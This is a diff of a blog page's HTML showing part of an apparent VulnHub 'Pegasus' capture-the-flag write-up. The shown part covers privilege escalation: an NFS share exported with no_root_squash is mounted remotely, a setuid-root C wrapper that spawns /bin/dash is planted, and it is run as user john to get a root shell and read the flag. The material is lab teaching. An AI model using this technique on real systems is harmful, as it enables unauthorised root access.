+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>/opt/nfs *<span class="o">(</span>rw,sync,crossmnt,no_subtree_check,no_root_squash
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>no_root_squash&hellip; we can mount it remotely and have our own uid! NFS will not set it to nobody:nobody&hellip;</p>
 
@@ -460,81 +564,106 @@ Matching Defaults entries for john on this host:
 
 <p>So, NFS huh ? What can I do with that ? <em>thinks</em>&hellip; well, I can mount it remotely and drop a file as root on my Kali box, suid the binary and execute it on Pegasus as john.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
-root@kali:~# cd /mnt/nfs
-root@kali:/mnt/nfs# ls -la
-total 8
-drwxr-xr-x 2 root root 4096 Nov 18 03:43 .
-drwxr-xr-x 4 root root 4096 Dec 19 13:09 ..
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
+</span><span class='line'>root@kali:~# <span class="nb">cd</span> /mnt/nfs
+</span><span class='line'>root@kali:/mnt/nfs# ls -la
+</span><span class='line'>total 8
+</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Nov <span class="m">18</span> 03:43 .
+</span><span class='line'>drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Dec <span class="m">19</span> 13:09 ..
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>OK, so a quick side note here - my Kali box is 64 bit&hellip; if it were 32 bit I could just copy /bin/sh to /mnt/nfs and suid it. So, in this case, I have to use a C wrapper to execute a shell instead.</p>
 
 <p>The code for the C wrapper is pretty straight forward</p>
 
-<p>[c]
-int main(void)
-{
-        system(&ldquo;/bin/dash&rdquo;);
-}
-[/c]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/dash&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>This is then compiled as a 32 bit binary, dropped into /mnt/nfs on my Kali box, and chmodded to 4777</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@kali:/mnt/nfs# gcc wrapper.c -m32
-root@kali:/mnt/nfs# chmod 4777 a.out
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/mnt/nfs# gcc wrapper.c -m32
+</span><span class='line'>root@kali:/mnt/nfs# chmod <span class="m">4777</span> a.out
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Which, when executed as user john, drops me to a root shell</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-john@pegasus:/opt/nfs$ ls -la
-ls -la
-total 32
-drwxr-xr-x 2 root root 4096 Dec 20 00:17 .
-drwxr-xr-x 5 root root 4096 Nov 18 20:51 ..
--rwsrwxrwx 1 root root 7160 Dec 20 00:17 a.out
-john@pegasus:/opt/nfs$ ./moo2
-./a.out</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@pegasus:/opt/nfs<span class="nv">$ </span>ls -la
+</span><span class='line'>ls -la
+</span><span class='line'>total 32
+</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Dec <span class="m">20</span> 00:17 .
+</span><span class='line'>drwxr-xr-x <span class="m">5</span> root root <span class="m">4096</span> Nov <span class="m">18</span> 20:51 ..
+</span><span class='line'>-rwsrwxrwx <span class="m">1</span> root root <span class="m">7160</span> Dec <span class="m">20</span> 00:17 a.out
+</span><span class='line'>john@pegasus:/opt/nfs<span class="nv">$ </span>./moo2
+</span><span class='line'>./a.out
+</span><span class='line'><span class="c"># id</span>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
+</span><span class='line'><span class="sb">``</span>
+</span><span class='line'>
+</span><span class='line'>Allowing the grail of grails... the ability to cat /root/flag
+</span></code></pre></td></tr></table></div></figure>
 
-<h1>id</h1>
 
-<p>uid=1000(john) gid=1001(mike) euid=0(root) groups=0(root),1001(mike)
-[/plain]</p>
-
-<p>Allowing the grail of grails&hellip; the ability to cat /root/flag</p>
-
-<p>[plain gutter=&ldquo;false&rdquo;]</p>
+<p> bash</p>
 
 <h1>cat flag</h1>
 
-<p>cat flag
-               ,
-               |<code>\
-              /'_/_
-            ,'_/\_/\_                       ,
-          ,'_/\'_\_,/_                    ,'|
-        ,'_/\_'_ \_ \_/                _,-'_/
-      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
-    ,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
-   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged
-    \_</code>> 6<code>7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
-     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
-      \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
-        &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/
-      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
-     ( ) \_ \|_ </code>_    _,/&lsquo;\,<em>&rsquo;</em>,/&lsquo;               a video game system sold in
-      \<em>  __)    <code>\_                             Poland, Serbia and Bosnia.
-       \_)   &gt;       </code>_                           It was a hardware clone of
-            /  <code>,      |</code>_                         the Nintendo Famicom.
-           /    \     / \ <code>\
-          /   __/|   /  / </code>\
-         (<code> (   (</code> (</em>  \   /
+<pre><code>           ,
+           |`\
+          /'_/_
+        ,'_/\_/\_                       ,
+      ,'_/\'_\_,/_                    ,'|
+    ,'_/\_'_ \_ \_/                _,-'_/
+  ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
+,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
+</code></pre>
+
+<p>   ( (&lsquo; )\/(<em> _ \&rsquo;</em>,\   <strong>&ndash;&lsquo; <em>,-</em>/<em>,-&rsquo;,</em>/ <em>\      mythology. He is a winged
+    _<code>\&gt; 6</code> 7  \&lsquo;</em>,/ ,-&rsquo; <em>,-,&lsquo;\,</em>&rsquo;<em> \,</em>/&lsquo;<em>,\       stallion usually depicted
+     \/-  </em>/ 7 &rsquo;/ <em>,&lsquo; </em>/&rsquo;_  \,<em>&lsquo;</em> _ \&rsquo;<em>,/         as pure white in color.
+      _&lsquo;/>   7&rsquo;</em>/&lsquo; <em>/&rsquo; _ &lsquo;\,</em>&rsquo;<em> _ \&lsquo;</em>,\          Symbol of wisdom and fame.
+        >/  _ ,V  ,&lt;  _<em> &rsquo;\,</em>&lsquo;<em> _ \&rsquo;</em>,/
+      /&lsquo;<em>  ( )</em>)\/-,&rsquo;,</strong> &lsquo;\,<em>&rsquo;</em>,_,\&lsquo;<em>\             Fun fact: Pegasus was also
+     ( ) _ |</em>  <code>\_    \_,/'\,_'_,/'               a video game system sold in
+      \\_  \_\_)   </code>_                             Poland, Serbia and Bosnia.
+       _)   >        <code>\_                           It was a hardware clone of
+            / </code>,      |<code>\_                         the Nintendo Famicom.
+           /    \     / \</code>\
+          /   <strong>/|   /  /  <code>\
+         (</code>  (   (<code>(_  \   /
          /  ,/    |  /  /   \
-        / ,/      | /   \   `_
-      <em>/</em>/        |/    /<em><em>/,</em>/
+        / ,/      | /   \  </code>_
+      <em>/</em>/        |/    /</strong>/,<em>/
      /</em>(         /_(</p>
 
 <p>CONGRATULATIONS! You made it :)</p>
@@ -550,7 +679,7 @@ and leave some feedback, I would love to hear from you!</p>
 
 <p>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
 more awesome boot2root VMs!
-[/plain]</p>
+&#8220;`</p>
 
 <p><img src="http://media.tumblr.com/tumblr_m7bmngSpkh1rs4olx.gif" alt="" /></p>
 </div>
